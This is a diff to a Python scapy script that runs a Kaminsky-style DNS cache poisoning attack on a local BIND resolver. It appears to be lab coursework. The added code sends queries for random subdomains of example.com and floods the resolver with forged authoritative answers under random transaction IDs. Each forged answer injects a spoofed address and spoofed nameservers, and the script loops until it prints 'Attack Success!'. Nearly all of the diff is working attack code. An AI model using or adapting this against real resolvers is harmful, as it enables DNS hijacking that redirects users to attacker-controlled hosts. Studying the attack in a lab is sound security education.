@@ -25,7 +25,7 @@ args = parser.parse_args()
 # BIND's addr
 DNS_ADDR = "127.0.0.1"
 # your bind's port (DNS queries are send to this port)
-DNS_PORT = args.dns_port #6060
+DNS_PORT = args.dns_port #7070
 
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port #5055
@@ -35,8 +35,8 @@ Generates random strings of length 10.
 '''
 def getRandomSubDomain():
     return ''.join(choice(ascii_lowercase + digits) for _ in range(10))
-
-DOMAIN_NAME = getRandomSubDomain() + '.example.com.'
+DOMAIN = "example.com"
+SUB_DOMAIN = getRandomSubDomain() + '.' + DOMAIN
 
 '''
 Generates random 8-bit integer.
@@ -49,53 +49,44 @@ def getRandomTXID():
 Sends a UDP packet.
 '''
 def sendPacket(sock, packet, ip, port):
-    sock.sendto(str(packet), (ip, port))  #bytes(packet)
+    sock.sendto(bytes(packet), (ip, port))  #bytes(packet)
 
 
 '''
 Example code that sends a DNS query using scapy.
 '''
 def exampleSendDNSQuery():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
-    dnsPacket = DNS(rd=1, qd=DNSQR(qname=DOMAIN_NAME))
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname=SUB_DOMAIN))
     sendPacket(sock, dnsPacket, DNS_ADDR, DNS_PORT)
-    # response = sock.recvfrom(4096)
-    # response = DNS(response)
-    # print("\n***** Packet Received from Remote Server *****")
-    # response.show()
-    # print("***** End of Remote Server Packet *****\n")
+    return sock
+
+def spoofDNS():
+    dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    print("Sub Domain", SUB_DOMAIN)
+    Qdsec = DNSQR(qname=SUB_DOMAIN)
+    Anssec = DNSRR(rrname=SUB_DOMAIN, type='A', rdata=SPROOF_ADDR, ttl=68900)
+    dns = DNS(id=getRandomTXID(), aa=1, rd=0, qr=1,
+                                  qdcount=1, ancount=1, nscount=2, arcount=0,
+                                  qd=Qdsec, 
+                                  an=Anssec,
+                                  ns=DNSRR(rrname=b'example.com', rdata=SPROOF_NS_1, type='NS')/DNSRR(rrname=b"example.com", type='NS', rdata=SPROOF_NS_2) )
+    response = dns
+
+    response.getlayer(DNS).qd.qname = SUB_DOMAIN
+    for _ in range(125):
+		# Set random TXID from 0 to 255
+        response.getlayer(DNS).id = getRandomTXID()
+        sendPacket(dns_sock, response, DNS_ADDR, my_query_port)
 
 if __name__ == '__main__':
-
-    # construct a response packet
-    Qdsec = DNSQR(qname=DOMAIN_NAME)
-    Anssec = DNSRR(rrname=DOMAIN_NAME, type='A', rdata='5.6.6.8', ttl=259200)
-    dns = DNS(id=getRandomTXID(), aa=1, rd=0, qr=1,
-                                  qcount=1, ancount=1, nscount=2, arcount=1,
-                                  qd=Qdsec, an=Anssec,
-                                  ns=DNSRR(rrname="example.com.", rclass=1, rdata=SPROOF_NS_1, type='NS')/DNSRR(rrname=DOMAIN_NAME, type='NS', rdata=SPROOF_NS_2) )
-    ip = IP(dst=DNS_ADDR, src="199.43.135.53", chksum=0)
-    udp = UDP(dport=my_query_port, sport=53, chksum=0)
-    response = ip/udp/dns
-
-    # response =  IP(dst=DNS_ADDR, src="199.43.135.53")/ \
-    #             UDP(sport=53, dport=my_query_port)/ \
-    #             DNS(id=getRandomTXID(), qr=1, rd=1, ra=1, aa=1, qdcount=1, ancount=1, nscount=2, arcount=0, 
-    #                 qd=DNSQR(qname=DOMAIN_NAME, qtype=1, qclass=1), 
-    #                 an=DNSRR(rrname=DOMAIN_NAME, rdata=SPROOF_ADDR, type='A'),
-    #                 ns=DNSRR(rrname="example.com", rclass=1, rdata=SPROOF_NS_1, type='NS')/DNSRR(rrname=DOMAIN_NAME, type='NS', rdata=SPROOF_NS_2)
-    #             )
-    response.show()
-
-    # send the dns query
-    exampleSendDNSQuery()
-
-    dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    for _ in range(50):
-		# TXID
-        response.getlayer(DNS).id = getRandomTXID()
-		# # len and chksum
-        # response.getlayer(UDP).len = IP(str(response)).len-20
-        # response[UDP].post_build(str(response[UDP]), str(response[UDP].payload))
-        sendPacket(dns_sock, response, DNS_ADDR, my_query_port)
+    while True:
+        SUB_DOMAIN = getRandomSubDomain() + '.' + DOMAIN
+        sock = exampleSendDNSQuery()
+        spoofDNS()
+        data, (addr, port) = sock.recvfrom(4096)
+        resp = DNS(data)
+        if resp[DNS].an and resp[DNS].an.rdata == SPROOF_ADDR:
+            print("Attack Success!")
+            break
